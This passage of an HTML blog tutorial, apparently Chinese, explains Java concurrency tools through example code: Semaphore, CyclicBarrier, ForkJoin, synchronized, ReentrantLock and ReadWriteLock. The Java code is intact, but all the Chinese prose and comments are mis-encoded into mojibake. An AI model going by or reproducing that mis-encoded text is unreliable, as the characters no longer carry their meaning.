class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å…±20ä¸ªé¡¾å®¢åœ¨æ’é˜ŸåŠç†</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.printf(<span class="string">&quot;é¡¾å®¢%dç­‰å¾…ä¸­..\n&quot;</span>, number);</span><br><span class="line">                    window.acquire(); <span class="comment">// è·å¾—ä¸€ä¸ªç‰Œ</span></span><br><span class="line">                    System.out.printf(<span class="string">&quot;å¼€å§‹ä¸ºé¡¾å®¢%dåŠç†ä¸šåŠ¡\n&quot;</span>, number);</span><br><span class="line">                    Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">                    System.out.printf(<span class="string">&quot;é¡¾å®¢%dåŠç†å®Œæˆ\n&quot;</span>, number);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    window.release(); <span class="comment">// å½’è¿˜ç‰Œ </span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Barrier </p><p>  åŒ<code>CountDownLatch</code>ä¸åŒçš„åœ°æ–¹æ˜¯<code>CyclicBarrier</code>æ˜¯å…ˆå¹²åé›†åˆï¼Œè€Œ<code>CountDownLatch</code>ä¸€èˆ¬æ˜¯å…ˆé›†åˆåå¼€å§‹å¹²ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¨¡æ‹Ÿé“¶è¡Œé‡‘åº“ã€‚</span></span><br><span class="line"><span class="comment">// é‡‘åº“å¤§é—¨å…±ä¸‰æŠŠé”ï¼Œåˆ†åˆ«æœ‰ä¸‰ä¸ªç»ç†æ‹¿ç€é’¥åŒ™ã€‚</span></span><br><span class="line"><span class="comment">// åªæœ‰ä¸‰ä¸ªç»ç†äººéƒ½å¼€é”æ—¶ï¼Œé‡‘åº“å¤§é—¨æ‰ä¼šå¼€ã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankVault</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">lockNumber</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// ä¿é™©åº“å¤§é—¨æœ‰ä¸‰æŠŠé”</span></span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">bankVaultDoor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(lockNumber, () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;é‡‘åº“å·²å¼€&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lockNumber; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="comment">// ç»ç†äºº</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.printf(<span class="string">&quot;ç»ç†%då¼€å§‹å¼€é”\n&quot;</span>, number);</span><br><span class="line">                    <span class="comment">// æ¨¡æ‹Ÿæ¯ä¸ªç»ç†äººçš„å¼€é”æ—¶é—´</span></span><br><span class="line">                    Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">                    System.out.printf(<span class="string">&quot;ç»ç†%då¼€å§‹å¼€é”å®Œæˆ\n&quot;</span>, number);</span><br><span class="line">                    <span class="comment">// å¼€é”</span></span><br><span class="line">                    bankVaultDoor.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">                    <span class="comment">//awaitä¸­æ–­</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ForkJoin</p><p>  ForkJoiné‡‡ç”¨åˆ†æ²»ç®—æ³•ï¼Œå°†å¤§ä»»åŠ¡æ‹†åˆ†æˆå°ä»»åŠ¡æ¥å¤„ç†ã€‚é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬ä¸éœ€è¦ç›´æ¥ç»§æ‰¿ForkJoinTaskç±»ï¼Œè€Œåªéœ€è¦ç»§æ‰¿å®ƒçš„å­ç±»ï¼ŒFork&#x2F;Joinæ¡†æ¶æä¾›äº†ä»¥ä¸‹ä¸¤ä¸ªå­ç±»ï¼š</p><ul><li>RecursiveActionï¼šç”¨äºæ²¡æœ‰è¿”å›ç»“æœçš„ä»»åŠ¡ã€‚</li><li>RecursiveTask ï¼šç”¨äºæœ‰è¿”å›ç»“æœçš„ä»»åŠ¡ã€‚</li></ul><p>  å¸¸ç”¨æ¨¡å¼ï¼ˆåˆ†æ²»ï¼‰ï¼š<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Result <span class="title function_">solve</span><span class="params">(Problem problem)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (problem is small) &#123;</span><br><span class="line">        <span class="comment">// ç›´æ¥è§£å†³</span></span><br><span class="line">        directly solve problem</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æ‹†åˆ†é—®é¢˜</span></span><br><span class="line">        split problem into independent parts</span><br><span class="line">        fork <span class="keyword">new</span> <span class="title class_">subtasks</span> to solve each part</span><br><span class="line">        join all subtasks</span><br><span class="line">        compose result from subresults</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  Fork&#x2F;Joinæ±‚å’Œ<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForkJoinSum</span> <span class="keyword">extends</span> <span class="title class_">RecursiveTask</span>&lt;Long&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] nums;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> low;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> high;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">THRESHOLD</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ForkJoinSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(nums, <span class="number">0</span>, nums.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ForkJoinSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.nums = nums;</span><br><span class="line">        <span class="built_in">this</span>.low = low;</span><br><span class="line">        <span class="built_in">this</span>.high = high;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Long <span class="title function_">compute</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// å°ä»»åŠ¡ç›´æ¥å¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span> (high - low &lt; THRESHOLD) &#123;</span><br><span class="line">            <span class="keyword">return</span> Arrays.stream(Arrays.copyOfRange(nums, low, high)).asLongStream().sum();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å¤§äººç‰©å…ˆæ‹†åˆ†å†åˆå¹¶ç»“æœ</span></span><br><span class="line">            <span class="type">ForkJoinSum</span> <span class="variable">left</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinSum</span>(nums, low, low + (high - low) / <span class="number">2</span>);</span><br><span class="line">            <span class="type">ForkJoinSum</span> <span class="variable">right</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinSum</span>(nums, low + (high - low) / <span class="number">2</span>, high);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ³¨æ„ï¼šä¸è¦ä¸¤ä¸ªçº¿ç¨‹éƒ½forkï¼Œä¸ç„¶å½“å‰çº¿ç¨‹å°†æ— ä»»åŠ¡å¯åšã€‚</span></span><br><span class="line">            <span class="comment">// invokeAllå…¶ä¸­leftä¼šåœ¨å½“å‰çº¿ç¨‹å†…æ‰§è¡Œï¼Œrightä¼šforkåœ¨çº¿ç¨‹æ± ä¸­å¦ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œã€‚</span></span><br><span class="line">            invokeAll(left, right);</span><br><span class="line">            <span class="keyword">return</span> left.join() + right.join();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[count];</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) nums[i] = random.nextInt(count);</span><br><span class="line"></span><br><span class="line">        <span class="type">ForkJoinPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinPool</span>(<span class="number">4</span>); <span class="comment">// æœ€å¤§å¹¶å‘æ•°4</span></span><br><span class="line">        <span class="type">ForkJoinSum</span> <span class="variable">task</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinSum</span>(nums);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">ret</span> <span class="operator">=</span> pool.invoke(task);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li></ul><h3 id="é”"><a href="#é”" class="headerlink" title="é”"></a>é”</h3><ul><li><p>å†…ç½®é” </p><p>  å†…ç½®é”èƒ½åŒæ—¶ä¿è¯<code>åŸå­æ€§</code>å’Œ<code>å¯è§æ€§</code>ã€‚å†…ç½®é”æ˜¯ç‹¬å é”ï¼Œä¼šå¢åŠ ä¸²è¡Œä»£ç æ¯”ä¾‹ï¼Œé™ä½ç¨‹åºçš„å¯ä¼¸ç¼©æ€§ã€‚</p><p>  å†…ç½®é”æ˜¯ä¸€ç§å¯é‡å…¥é”ï¼Œå¦‚æœå·²ç»è·å¾—äº†é”ï¼Œåé¢åœ¨é‡åˆ°ç›¸åŒçš„é”æ—¶å¯ä»¥ç›´æ¥è¿›å…¥ã€‚</p><p>  æ˜¯ç”¨ä¸ç”¨çš„é”ç»„åˆæ—¶ä¸€å®šè¦æ³¨æ„åŠ é”çš„é¡ºåºï¼Œé¿å…äº¤å‰é€ æˆæ­»é”çš„é—®é¢˜ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é”ä¸ºå®ä¾‹(this)å¯¹è±¡ </span></span><br><span class="line"><span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç‰¹å®šçš„é”å¯¹è±¡ï¼Œå¯ä»¥å°†é”å¯¹è±¡å°é—­åœ¨ç¨‹åºå†…éƒ¨ã€‚</span></span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é”ä¸ºclasså¯¹è±¡</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ReentrantLock </p><p>  <code>ReentrantLock</code>æä¾›äº†å’Œ<code>synchronized</code>ä¸€æ ·çš„äº’æ–¥æ€§åŠå†…å­˜å¯è§æ€§ã€‚åœ¨å¤§å¤šæ•°åœºæ™¯ä¸‹ä½¿ç”¨<code>synchronized</code>å°±å¤Ÿäº†ï¼Œä½†æ˜¯å†…ç½®é”æœ‰ä¸€äº›å±€é™æ€§ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ— æ³•ä¸­æ–­ä¸€ä¸ªç­‰å¾…è·å–é”çš„çº¿ç¨‹ã€‚ä½†æ˜¯ä½¿ç”¨<code>ReentrantLock</code>ä¹Ÿæœ‰ç¼ºç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾é”ã€‚<code>ReentrantLock</code>å’Œå†…ç½®é”æ€§èƒ½ç›¸å½“ï¼Œä»…å½“å†…ç½®é”ä¸èƒ½æ»¡è¶³éœ€æ±‚æ—¶æ‰è€ƒè™‘ä½¿ç”¨<code>ReentrantLock</code>ã€‚å°±æ€§èƒ½è€Œè¨€ï¼Œæˆ‘ä»¬ä¹Ÿåº”å½“é¦–é€‰å†…ç½®é”ï¼Œå› ä¸ºå†…ç½®é”çš„JVMçš„å†…ç½®å±æ€§ï¼Œå®ƒèƒ½æ‰§è¡Œä¸€äº›ä¼˜åŒ–ã€‚</p><p>  <code>ReentrantLock</code>å¯ä»¥æä¾›å…¬å¹³é”ï¼Œçº¿ç¨‹æŒ‰ç…§å®ƒä»¬å‘å‡ºè¯·æ±‚çš„é¡ºåºæ¥è·å¾—é”ã€‚éå…¬å¹³é”å…è®¸<code>æ’é˜Ÿ</code>è¡Œä¸ºï¼Œå½“è¯·æ±‚ä¸€æŠŠéå…¬å¹³é”æ—¶ï¼Œå¦‚æœåœ¨å‘å‡ºè¯·æ±‚æ—¶åŒæ—¶æ”¹é”çŠ¶æ€å˜ä¸ºå¯ç”¨ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°†è·³è¿‡æ‰€æœ‰ç­‰å¾…çº¿ç¨‹è€Œè·å¾—è¿™ä¸ªé”ã€‚ç”±äºå…¬å¹³é”æ‰€æœ‰çº¿ç¨‹åœ¨ç­‰å¾…é”æ—¶éƒ½è¦æ’é˜Ÿï¼Œè¿™å°†ä¼šå¢åŠ çº¿ç¨‹åˆ‡æ¢é™ä½æ€§èƒ½ï¼Œè€Œ<code>æ’é˜Ÿ</code>å°†å‡å°‘ä¸€æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚å½“æŒæœ‰é”çš„æ—¶é—´è¾ƒé•¿æ—¶ï¼Œåº”è¯¥ä½¿ç”¨å…¬å¹³é”ã€‚</p><p>  <code>ReentrantLock</code>å®ç°äº†<code>Lock</code>æ¥å£ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Lock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸€æŠŠé”</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸€æŠŠé”ï¼Œé”è·å–æ—¶å¯ä»¥ä¸­æ–­</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ä¸€æŠŠé”ï¼Œè·å¾—è¿”å›true</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°è¯•è·å¾—ä¸€æŠŠé”ï¼Œç­‰å¾…ä¸€å®šçš„æ—¶é—´ï¼ˆè·å–é”æ—¶å¯ä¸­æ–­ï¼‰ã€‚è·å¾—è¿”å›true</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡Šæ”¾é”</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">    Condition <span class="title function_">newCondition</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  ç»„åˆè¿ç”¨</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcurrentIncrease</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ++total;</span><br><span class="line">            <span class="comment">// å†…éƒ¨è¾“å‡ºåä¼šå‘ç”ŸIOé˜»å¡ï¼Œä¼šæ”¾å¼ƒCPUèµ„æº</span></span><br><span class="line">            <span class="comment">// System.out.printf(&quot;total: %d\n&quot;, total);</span></span><br><span class="line">            <span class="keyword">return</span> total;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ConcurrentIncrease</span> <span class="variable">increase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentIncrease</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(count);</span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">done</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(count, () -&gt; &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;total: %d\n&quot;</span>, increase.total);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    start.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignored) &#123; &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(increase.incr());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    done.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException | BrokenBarrierException ignored) &#123; &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line"></span><br><span class="line">            start.countDown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ReadWriteLock </p><p>  <code>ReentrantLock</code>å’Œå†…ç½®é”éƒ½æ˜¯äº’æ–¥é”ï¼Œæ¯æ¬¡åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”ã€‚äº’æ–¥é”æ˜¯ä¸€ç§ä¿å®ˆçš„åŠ é”ç­–ç•¥ï¼Œå®ƒå¯ä»¥é¿å…<code>å†™\å†™</code>å’Œ<code>è¯»\å†™</code>çš„å†²çªï¼Œä½†å®ƒåŒæ—¶ä¹Ÿé™åˆ¶äº†<code>è¯»\è¯»</code>ã€‚è¯»å†™é”æ­£æ˜¯æ¥è§£å†³è¿™ä¸€é—®é¢˜çš„ï¼Œåªè¦èƒ½ä¿è¯æ¯ä¸ªçº¿ç¨‹éƒ½èƒ½è¯»åˆ°æœ€æ–°çš„æ•°æ®ï¼Œå¹¶ä¸”è¯»æ•°æ®æ—¶ä¸ä¼šæœ‰å…¶å®ƒçº¿ç¨‹æ¥ä¿®æ”¹æ•°æ®ï¼Œé‚£å°±ä¸ä¼šå‘ç”Ÿé—®é¢˜ã€‚ä½¿ç”¨äº†è¯»å†™é”åï¼Œä¸€ä¸ªèµ„æºå¯ä»¥åŒæ—¶è¢«å¤šä¸ªè¯»æ“ä½œæˆ–è€…ä¸€ä¸ªå†™æ“ä½œï¼Œä½†äºŒè€…ä¸èƒ½åŒæ—¶è¿›è¡Œã€‚</p><p>  è¯»å†™é”å®ç°æ–¹å¼</p><ul><li><strong>é‡Šæ”¾ä¼˜å…ˆ</strong>ã€‚å½“å†™å…¥çº¿ç¨‹é‡Šæ”¾å†™é”æ—¶ï¼Œå¦‚æœæ­£åœ¨æ’é˜Ÿçš„åŒæ—¶å­˜åœ¨è¯»å’Œå†™çº¿ç¨‹ï¼Œæ”¹ä¼˜å…ˆé€‰æ‹©è¯»çº¿ç¨‹è¿˜æ˜¯å†™çº¿ç¨‹ã€‚</li><li><strong>è¯»çº¿ç¨‹æ’é˜Ÿ</strong>ã€‚å¦‚æœé”æœ‰è¯»çº¿ç¨‹è·å–ï¼Œä½†æ˜¯æœ‰å†™çº¿ç¨‹ç­‰å¾…ï¼Œé‚£ä¹ˆæ–°åˆ°çš„è¯»çº¿ç¨‹æ˜¯å¦èƒ½ç«‹å³è·å¾—é”ï¼Œè¿˜æ˜¯æ’é˜Ÿåœ¨å†™çº¿ç¨‹åé¢ã€‚</li><li><strong>é‡å…¥æ€§</strong>ã€‚è¯»å–é”å’Œå†™å…¥é”æ˜¯å¦å¯é‡å…¥ã€‚</li><li><strong>é™çº§</strong>ã€‚å¦‚æœä¸€ä¸ªçº¿ç¨‹æŒæœ‰å†™å…¥é”ï¼Œå®ƒæ˜¯å¦èƒ½å†ä¸é‡Šæ”¾è¯¥é”çš„æƒ…å†µä¸‹è·å–è¯»é”ã€‚è¿™ä¸ªçº¿ç¨‹å°†åŒæ—¶æ‹¥æœ‰è¯»å†™é”ï¼ŒåŒæ—¶å°†é˜»æ­¢å…¶å®ƒçº¿ç¨‹å¯¹è¢«ä¿æŠ¤èµ„æºçš„è¯»å†™ã€‚</li><li><strong>å‡çº§</strong>ã€‚è¯»é”èƒ½å¦ç”±äºå…¶å®ƒæ­£åœ¨ç­‰å¾…çš„è¯»çº¿ç¨‹å’Œå†™çº¿ç¨‹å‡çº§ä¸ºä¸€ä¸ªå†™å…¥é”ã€‚ï¼ˆè¿™åå•†ä¸å¥½å°†å‘ç”Ÿæ­»é”çš„æƒ…å†µï¼Œå¦‚æœä¸¤ä¸ªè¯»é”åŒæ—¶è¦å‡çº§ä¸ºå†™é”ï¼‰ã€‚</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 